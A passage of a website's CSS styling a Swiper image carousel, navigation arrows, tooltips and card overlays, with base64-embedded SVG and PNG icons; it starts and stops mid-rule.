11'%20stroke-linecap%3D'round'%2F%3E%3C%2Fdefs%3E%3Cg%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(30%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(60%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(90%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(120%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(150%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.37'%20transform%3D'rotate(180%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.46'%20transform%3D'rotate(210%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.56'%20transform%3D'rotate(240%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.66'%20transform%3D'rotate(270%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.75'%20transform%3D'rotate(300%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.85'%20transform%3D'rotate(330%2060%2C60)'%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E")}@-webkit-keyframes swiper-preloader-spin{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes swiper-preloader-spin{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.swiper-container .swiper-notification{position:absolute;left:0;top:0;pointer-events:none;opacity:0;z-index:-1000}.swiper-container-fade.swiper-container-free-mode .swiper-slide{-webkit-transition-timing-function:ease-out;-o-transition-timing-function:ease-out;transition-timing-function:ease-out}.swiper-container-fade .swiper-slide{pointer-events:none;-webkit-transition-property:opacity;-o-transition-property:opacity;transition-property:opacity}.swiper-container-fade .swiper-slide .swiper-slide{pointer-events:none}.swiper-container-fade .swiper-slide-active,.swiper-container-fade .swiper-slide-active .swiper-slide-active{pointer-events:auto}.swiper-container-cube{overflow:visible}.swiper-container-cube .swiper-slide{pointer-events:none;-webkit-backface-visibility:hidden;backface-visibility:hidden;z-index:1;visibility:hidden;-webkit-transform-origin:0 0;-ms-transform-origin:0 0;transform-origin:0 0;width:100%;height:100%}.swiper-container-cube .swiper-slide .swiper-slide{pointer-events:none}.swiper-container-cube.swiper-container-rtl .swiper-slide{-webkit-transform-origin:100% 0;-ms-transform-origin:100% 0;transform-origin:100% 0}.swiper-container-cube .swiper-slide-active,.swiper-container-cube .swiper-slide-active .swiper-slide-active{pointer-events:auto}.swiper-container-cube .swiper-slide-active,.swiper-container-cube .swiper-slide-next,.swiper-container-cube .swiper-slide-next+.swiper-slide,.swiper-container-cube .swiper-slide-prev{pointer-events:auto;visibility:visible}.swiper-container-cube .swiper-slide-shadow-bottom,.swiper-container-cube .swiper-slide-shadow-left,.swiper-container-cube .swiper-slide-shadow-right,.swiper-container-cube .swiper-slide-shadow-top{z-index:0;-webkit-backface-visibility:hidden;backface-visibility:hidden}.swiper-container-cube .swiper-cube-shadow{position:absolute;left:0;bottom:0;width:100%;height:100%;background:#000;opacity:.6;-webkit-filter:blur(50px);filter:blur(50px);z-index:0}.swiper-container-flip{overflow:visible}.swiper-container-flip .swiper-slide{pointer-events:none;-webkit-backface-visibility:hidden;backface-visibility:hidden;z-index:1}.swiper-container-flip .swiper-slide .swiper-slide{pointer-events:none}.swiper-container-flip .swiper-slide-active,.swiper-container-flip .swiper-slide-active .swiper-slide-active{pointer-events:auto}.swiper-container-flip .swiper-slide-shadow-bottom,.swiper-container-flip .swiper-slide-shadow-left,.swiper-container-flip .swiper-slide-shadow-right,.swiper-container-flip .swiper-slide-shadow-top{z-index:0;-webkit-backface-visibility:hidden;backface-visibility:hidden}.swiper-container-coverflow .swiper-wrapper{-ms-perspective:1200px}</style><style type="text/css">/* Override swiper plugin css */
.swiper-wrapper {
    height: 100% !important;
}

.swiper-container:hover .swiper-pagination.swiper-pagination-progressbar {
    opacity: 1;
}

.swiper-button-disabled {
    display: none !important;
}

.swiper-pagination.swiper-pagination-progressbar {
    position: absolute;
    right: 0;
    top: -25px;
    left: auto;
    width: 100px;
    height: 5px;
    border-radius: 5px;
    opacity: 0;
    transition: opacity 0.5s linear;
}

.swiper-pagination.swiper-pagination-progressbar .swiper-pagination-progressbar-fill {
    background: #50E3C2;
    border-radius: 5px;
}

.swiper-container-autoheight, .swiper-container-autoheight .swiper-slide {
    height: auto !important;
}

.swiper-container-autoheight .swiper-wrapper {
    height: auto !important;
}
</style><style type="text/css">._1-uu7j7W590ki8hPi5zK2j {
  position: relative;
  width: 100%; }
  ._1-uu7j7W590ki8hPi5zK2j > div {
    overflow: visible;
    -webkit-backface-visibility: hidden;
    backface-visibility: hidden; }
  ._1-uu7j7W590ki8hPi5zK2j:hover ._3xgdB66ZLrTFMtP8Sx-iF5 {
    opacity: 1; }
  ._1-uu7j7W590ki8hPi5zK2j ._3xgdB66ZLrTFMtP8Sx-iF5 {
    top: 52%;
    -webkit-transform: translateY(-100%);
    transform: translateY(-100%);
    opacity: 0; }

._3xgdB66ZLrTFMtP8Sx-iF5 {
  position: absolute;
  top: 50%;
  z-index: 2;
  width: 52px;
  height: 52px;
  box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.5);
  background-color: #ffffff;
  border-radius: 50%;
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: center;
  justify-content: center;
  cursor: pointer;
  -webkit-transform: translateY(-50%);
  transform: translateY(-50%);
  transition: opacity 0.5s linear;
  background-repeat: no-repeat;
  background-size: 11px auto;
  background-position: center; }
  @media (max-width: 767px) {
    ._3xgdB66ZLrTFMtP8Sx-iF5 {
      display: none; } }
  ._3xgdB66ZLrTFMtP8Sx-iF5:focus {
    outline: 0; }
  ._3xgdB66ZLrTFMtP8Sx-iF5.hcUDqreHaIyx8X1qgEbJK {
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMzA4cHgiIGhlaWdodD0iNDg2cHgiIHZpZXdCb3g9IjAgMCAzMDggNDg2IiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9Im5vdW5fQXJyb3dfMTg4ODA0NiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTUuMDAwMDAwLCAtMTEuMDAwMDAwKSIgZmlsbD0iIzAwMDAwMCIgZmlsbC1ydWxlPSJub256ZXJvIj4KICAgICAgICAgICAgPGcgaWQ9Ikdyb3VwIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCwgNS4wNjIwNjMpIj4KICAgICAgICAgICAgICAgIDxwb2x5Z29uIGlkPSJTaGFwZSIgcG9pbnRzPSI2MC4yNjgyNTQgNS45NzQ3NjE5IDUuMjA3OTM2NTEgNjMuMjY2NDI4NiAxOTcuNjY4MjU0IDI0OS4wMzAxNTkgNS4yMDc5MzY1MSA0MzQuNTQ2MDMyIDYwLjI2ODI1NCA0OTEuODM3MzAyIDI4Mi40OTA0NzYgMjc3LjU1MjM4MSAzMTIuMjUyMzgxIDI0OS4wMzAxNTkgMjgyLjQ5MDQ3NiAyMjAuMjYwNDc2Ij48L3BvbHlnb24+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPgo=);
    right: 10px; }
  ._3xgdB66ZLrTFMtP8Sx-iF5._12kZG41M6OUPUQne1dHed- {
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMzA4cHgiIGhlaWdodD0iNDg2cHgiIHZpZXdCb3g9IjAgMCAzMDggNDg2IiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9Im5vdW5fQXJyb3dfMTg4ODA0Ni1Db3B5IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNTMuNzMwMTU5LCAyMzkuMDAwMDAwKSBzY2FsZSgtMSwgMSkgdHJhbnNsYXRlKC0xNTMuNzMwMTU5LCAtMjM5LjAwMDAwMCkgdHJhbnNsYXRlKC01LjAwMDAwMCwgLTExLjAwMDAwMCkiIGZpbGw9IiMwMDAwMDAiIGZpbGwtcnVsZT0ibm9uemVybyI+CiAgICAgICAgICAgIDxnIGlkPSJHcm91cCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDUuMDYyMDYzKSI+CiAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iU2hhcGUiIHBvaW50cz0iNjAuMjY4MjU0IDUuOTc0NzYxOSA1LjIwNzkzNjUxIDYzLjI2NjQyODYgMTk3LjY2ODI1NCAyNDkuMDMwMTU5IDUuMjA3OTM2NTEgNDM0LjU0NjAzMiA2MC4yNjgyNTQgNDkxLjgzNzMwMiAyODIuNDkwNDc2IDI3Ny41NTIzODEgMzEyLjI1MjM4MSAyNDkuMDMwMTU5IDI4Mi40OTA0NzYgMjIwLjI2MDQ3NiI+PC9wb2x5Z29uPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4K);
    background-position: 47% center;
    left: 10px; }

._3J-bb2ekyOqaQBj7SDFqOY {
  position: relative;
  width: 514px; }
  ._3J-bb2ekyOqaQBj7SDFqOY:hover ._3xgdB66ZLrTFMtP8Sx-iF5 {
    opacity: 1; }
  ._3J-bb2ekyOqaQBj7SDFqOY ._3xgdB66ZLrTFMtP8Sx-iF5 {
    opacity: 0; }
    ._3J-bb2ekyOqaQBj7SDFqOY ._3xgdB66ZLrTFMtP8Sx-iF5.hcUDqreHaIyx8X1qgEbJK {
      right: -35px; }
    ._3J-bb2ekyOqaQBj7SDFqOY ._3xgdB66ZLrTFMtP8Sx-iF5._12kZG41M6OUPUQne1dHed- {
      left: -35px; }

@media (max-width: 768px) {
  ._3J-bb2ekyOqaQBj7SDFqOY {
    width: 100%; }
    ._3J-bb2ekyOqaQBj7SDFqOY > div {
      overflow: visible;
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden; } }

@media (max-width: 1145px) {
  ._3J-bb2ekyOqaQBj7SDFqOY {
    width: 380px; } }
</style><style type="text/css">._2YyGVGa2ZcX_c7NLKdCAqV {
  display: -webkit-inline-flex;
  display: inline-flex;
  -webkit-align-items: center;
  align-items: center; }
  ._2YyGVGa2ZcX_c7NLKdCAqV svg {
    width: 100%;
    height: 100%; }
</style><style type="text/css">.tooltip.blu-tooltip.dark .tooltip-inner {
  color: #ffffff;
  background-color: #242630;
  letter-spacing: 1px;
  max-width: 300px;
  border-radius: 4px;
  padding: 5px 10px; }

.tooltip.blu-tooltip.dark.bs-tooltip-top .arrow {
  border-top-color: #242630; }

.tooltip.blu-tooltip.dark.bs-tooltip-bottom .arrow {
  border-bottom-color: #242630; }

.tooltip.blu-tooltip.dark.bs-tooltip-right .arrow {
  border-right-color: #242630; }

.tooltip.blu-tooltip.dark.bs-tooltip-left .arrow {
  border-left-color: #242630; }

.tooltip.blu-tooltip.dark.show {
  opacity: .9; }

.tooltip.blu-tooltip.light .tooltip-inner {
  color: #2f3141;
  background-color: #EFEFEF;
  letter-spacing: normal;
  max-width: 388px;
  border-radius: 5px;
  box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.5);
  padding: 16px; }

.tooltip.blu-tooltip.light .arrow {
  border: 12px solid transparent; }

.tooltip.blu-tooltip.light.bs-tooltip-top .tooltip-inner {
  margin-bottom: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-top .arrow {
  bottom: 6px;
  border-top-color: #EFEFEF; }

.tooltip.blu-tooltip.light.bs-tooltip-bottom .tooltip-inner {
  margin-top: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-bottom .arrow {
  top: 6px;
  border-bottom-color: #EFEFEF; }

.tooltip.blu-tooltip.light.bs-tooltip-right .tooltip-inner {
  margin-left: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-right .arrow {
  left: 6px;
  border-right-color: #EFEFEF; }

.tooltip.blu-tooltip.light.bs-tooltip-left .tooltip-inner {
  margin-right: 18px; }

.tooltip.blu-tooltip.light.bs-tooltip-left .arrow {
  right: 6px;
  border-left-color: #EFEFEF; }

.tooltip.blu-tooltip.light.show {
  opacity: 1; }

.tooltip.blu-tooltip .tooltip-inner {
  font-family: 'Work Sans', sans-serif;
  font-size: 14px;
  font-weight: 400;
  text-align: left; }

.tooltip.blu-tooltip .arrow {
  position: absolute;
  width: 0;
  height: 0;
  border: 5px solid transparent; }

.tooltip.blu-tooltip.bs-tooltip-top .tooltip-inner {
  margin-bottom: 10px; }

.tooltip.blu-tooltip.bs-tooltip-top .arrow {
  bottom: 5px;
  border-bottom-width: 0; }

.tooltip.blu-tooltip.bs-tooltip-bottom .tooltip-inner {
  margin-top: 10px; }

.tooltip.blu-tooltip.bs-tooltip-bottom .arrow {
  top: 5px;
  border-top-width: 0; }

.tooltip.blu-tooltip.bs-tooltip-right .tooltip-inner {
  margin-left: 10px; }

.tooltip.blu-tooltip.bs-tooltip-right .arrow {
  left: 5px;
  border-left-width: 0; }

.tooltip.blu-tooltip.bs-tooltip-left .tooltip-inner {
  margin-right: 10px; }

.tooltip.blu-tooltip.bs-tooltip-left .arrow {
  right: 5px;
  border-right-width: 0; }

.tooltip.blu-tooltip.show {
  z-index: 9999; }

@media (max-width: 767px) {
  .tooltip.blu-tooltip.light .tooltip-inner {
    max-width: 300px; } }
</style><style type="text/css">._3oXvgo_5jbJXnWSRlyK6EC {
  overflow: visible; }

._1H6fNaLo41-CHnLjRxWQ0M {
  border-radius: 3px;
  overflow: hidden;
  background-color: #2e2e42;
  position: relative; }
  ._1H6fNaLo41-CHnLjRxWQ0M:hover .z9MClmrtBvrCIDpfuYtZu {
    background-color: rgba(255, 255, 255, 0.15); }
  ._1H6fNaLo41-CHnLjRxWQ0M:hover ._2R_YBroNAP6YdM8KD3Noye, ._1H6fNaLo41-CHnLjRxWQ0M:hover ._3nfm5Km3IECVMhZc2mugn3 {
    display: -webkit-flex;
    display: flex;
    text-align: center;
    padding-left: 10px;
    padding-right: 10px; }
  ._1H6fNaLo41-CHnLjRxWQ0M:hover ._2dkzyoz33xB-iCk-8lwB76 {
    -webkit-transform: translateY(-14px);
    transform: translateY(-14px); }

._2R_YBroNAP6YdM8KD3Noye, ._3nfm5Km3IECVMhZc2mugn3 {
  display: none;
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 100%;
  -webkit-flex-wrap: wrap;
  flex-wrap: wrap;
  -webkit-flex-direction: column;
  flex-direction: column;
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: center;
  justify-content: center;
  background-color: rgba(0, 0, 0, 0.7);
  color: #b2b4b6;
  z-index: 1; }
  ._2R_YBroNAP6YdM8KD3Noye > span, ._3nfm5Km3IECVMhZc2mugn3 > span {
    margin-bottom: 15px;
    font-size: 20px; }

._3M0V-e7eLo6wk4JyQZv6Pl {
  color: #b2b4b6;
  font-size: 18px;
  text-decoration: none; }

._3nfm5Km3IECVMhZc2mugn3 {
  display: -webkit-flex;
  display: flex; }

._29s54BBUvfVGVr1GkpWaHg {
  display: block;
  width: 100%; }

.z9MClmrtBvrCIDpfuYtZu {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  overflow: hidden;
  cursor: pointer;
  border-radius: 0 0 3px 3px; }

._2i-ahA6NPmFKXQG2vH-smt {
  position: absolute !important;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #2E2E42;
  color: rgba(255, 255, 255, 0.5);
  font-size: 18px;
  font-weight: 500;
  line-height: 1.4;
  padding: 10px 5px 10px 15px;
  z-index: 1; }

._2dkzyoz33xB-iCk-8lwB76 {
  position: absolute;
  bottom: 0;
  left: 17px;
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: flex-start;
  justify-content: flex-start;
  -webkit-transform: translateY(100%);
  transform: translateY(100%);
  transition: all .2s ease-in-out; }
  ._2dkzyoz33xB-iCk-8lwB76 button {
    width: 45px;
    height: 45px; }

.BF8SVg_cYFcnB4vyQA0Rr {
  position: absolute;
  top: 25px;
  right: 20px;
  width: auto;
  padding: 5px 20px;
  border-radius: 3px;
  background-color: rgba(255, 255, 255, 0.8);
  text-align: center;
  z-index: 1;
  display: -webkit-flex;
  display: flex; }

._3n-sbu6F8eS0ZUqkoX-Le- {
  color: #242630;
  font-size: 14px;
  font-weight: 400;
  text-transform: uppercase;
  line-height: 1.3; }

._1FfDcP4cNVoV8k29-IsBsj:before {
  content: '';
  display: inline-block;
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAM4AAABECAMAAAD+6vpIAAAC5VBMVEUAAAAAAAAAAAAAAAAAAAAAADMAACsAJCQgICAcHBwaGjMXFy4VFSsUFCcSJCQiIjMgIDAeHi0cHCsbGzYaGjMYJDEjIy4hISwgIDUfHzMdHTEcHC8bJC4jIzUiIjMhITEgIDAfHy4eHjUdJDMjIzIiIjAiIjYhITQgIDMfHzIkJDUjIzQiIjMhITIhITEgIDUfJDQkJDMjIzIiIjYiIjUhITQgIDMgJDIkJDYjIzUjIzQiIjMhITIhITUgJDUkJDQjIzMjIzIiIjUiIjUhJTQhJDMkJDYjIzUjIzQiIjQiIjMiJTYhJDUkJDQkJDQjIzMjIzYiIjUiJTQhJDQkJDUjIzUjIzQiIjQiJTYiJDUhJDUkJDQjIzQjIzYjIzUiJTUiJDQhJDQkJDYjIzUjIzUjIzQiJTYiJDUiJDUkJDQjIzQjIzYjIzUiJTUiJDQiJDQkJDYjIzUjIzQjJTQiJDYiJDUkJDUkJDQjIzYjIzUjJTUiJDUiJDQkJDYkJDUjIzUjJTUjJDYiJDUkJDUkJDUjIzYjJTYjJTUjJDUiJDQkJDYkJDUjIzUjJTUjJTQjJDYiJDUkJDUkJDUjIzQjJTYjJTUjJDUjJDUkJDYkJDYkJDUjJTUjJDYjJDYkJDUkJDUkJDUjJTYjJTUjJDUjJDUkJDYkJDYkJDUjJTUjJTUjJDYjJDYjJDUkJDUkJDUjJTYjJTYjJDUjJDUkJDYkJDUjJTUjJTUjJDYjJDUkJDUkJTUjJTYjJTYjJDUjJDUjJDUkJDYkJTYjJTUjJDYjJDUkJDUkJTUkJTYjJTYjJDUjJDUjJDUkJDYkJTYkJTUjJTUjJDUjJDYjJDYkJDUkJTUkJTYjJTYjJDYjJDUjJDUkJDYkJTYkJTUjJTUjJDUjJDYjJDYkJDUkJTUkJTUkJTYjJDYjJDUjJDUkJDYkJTYkJTYkJTUjJDUjJDYjJDYkJDUkJTUkJTUkJTYjJDYjJDUjJDUkJTbHzzgWAAAA9nRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkrLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RWV1hZWltcXV5fYGFiY2RlZmdoaWpr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);
  background-size: 100%;
  background-repeat: no-repeat;
  background-position: center;
  width: 38px;
  min-height: 100%;
  vertical-align: bottom; }

.n7lXUIj4O9tTqjnlDQGYn {
  position: absolute;
  bottom: 0;
  width: 100%;
  height: 5px;
  background-color: rgba(255, 255, 255, 0.5); }

._3-AT-IMRAoW7867MGPWRFG {
  position: absolute;
  bottom: 0;
  width: 0;
  height: 100%;
  background-color: #55ccff; }

._1wpHEBFSV9sBORpz_l6nyR {
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: space-between;
  justify-content: space-between;
  margin-top: 15px; }
  ._1wpHEBFSV9sBORpz_l6nyR ._2YSkpGMt8-mn-d20SOCrev {
    color: #FFFFFF;
    font-size: 22px;
    font-weight: 500; }
  ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9 {
    display: -webkit-flex;
    display: flex;
    -webkit-align-items: center;
    align-items: center;
    -webkit-justify-content: center;
    justify-content: center;
    background-color: rgba(255, 255, 255, 0.1);
    border-radius: 5px;
    width: 41px;
    height: 21px;
    cursor: pointer;
    outline: 0;
    border: none;
    box-sizing: border-box;
    padding: 0; }
    ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9._2jX5x8tchwHHBC6wHupQld, ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9:hover {
      background-color: #FFFFFF; }
      ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9._2jX5x8tchwHHBC6wHupQld svg path, ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9._2jX5x8tchwHHBC6wHupQld svg ellipse, ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9:hover svg path, ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9:hover svg ellipse {
        fill: #232530; }
    ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9 svg path, ._1wpHEBFSV9sBORpz_l6nyR ._3Mu9qc5056Zwtd3IPUHoD9 svg ellipse {
      fill: rgba(255, 255, 255, 0.6); }

@media (max-width: 769px) {
  ._1wpHEBFSV9sBORpz_l6nyR ._2YSkpGMt8-mn-d20SOCrev {
    font-size: 18px; }
  ._2i-ahA6NPmFKXQG2vH-smt {
    font-size: 18px;
    line-height: 1.2; }
  ._2dkzyoz33xB-iCk-8lwB76 {
    display: none; }
  ._2R_YBroNAP6YdM8KD3Noye, ._3nfm5Km3IECVMhZc2mugn3 {
    display: none; } }
</style><style type="text/css">.scrollarea-content{margin:0;padding:0;overflow:hidden;position:relative}.scrollarea-content:focus{outline:0}.scrollarea{position:relative;overflow:hidden}.scrollarea .scrollbar-container{position:absolute;background:none;opacity:.1;z-index:9999;-webkit-transition:all .4s;transition:all .4s}.scrollarea .scrollbar-container.horizontal{width:100%;height:10px;left:0;bottom:0}.scrollarea .scrollbar-container.horizontal .scrollbar{width:20px;height:8px;background:#000;margin-top:1px}.scrollarea .scrollbar-container.vertical{width:10px;height:100%;right:0;top:0}.scrollarea .scrollbar-container.vertical .scrollbar{width:8px;height:20px;background:#000;margin-left:1px}.scrollarea .scrollbar-container.active,.scrollarea .scrollbar-container:hover{background:gray;opacity:.6!important}.scrollarea:hover .scrollbar-container{opacity:.3}</style><style type="text/css">.scrollarea {
  height: 100%; }
  .scrollarea:hover .scrollbar-container .scrollbar {
    opacity: 1; }
  .scrollarea .scrollarea-content {
    padding-right: 25px; }
  .scrollarea .scrollbar-container {
    width: 14px !important;
